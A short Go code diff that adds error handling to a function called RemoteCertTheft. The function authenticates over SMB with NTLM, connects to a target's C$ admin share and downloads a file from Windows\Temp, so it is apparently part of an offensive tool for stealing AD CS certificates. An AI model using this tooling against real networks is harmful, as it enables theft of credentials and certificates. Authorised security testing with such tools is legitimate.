@@ -137,9 +137,15 @@ func RemoteCertTheft(target, method string, cfg *ADCSConfig) error {
 	}
 	defer conn.Close()
 	s := &smbSession{conn: conn}
-	s.negotiate()
-	s.sessionSetupNTLM(cfg)
-	s.treeConnect(target, "C$")
+	if err := s.negotiate(); err != nil {
+		return fmt.Errorf("SMB negotiate: %w", err)
+	}
+	if err := s.sessionSetupNTLM(cfg); err != nil {
+		return fmt.Errorf("SMB auth: %w", err)
+	}
+	if err := s.treeConnect(target, "C$"); err != nil {
+		return fmt.Errorf("SMB tree connect C$: %w", err)
+	}
 
 	data, err := s.downloadFile("Windows\\Temp\\" + remoteFile)
 	if err != nil {
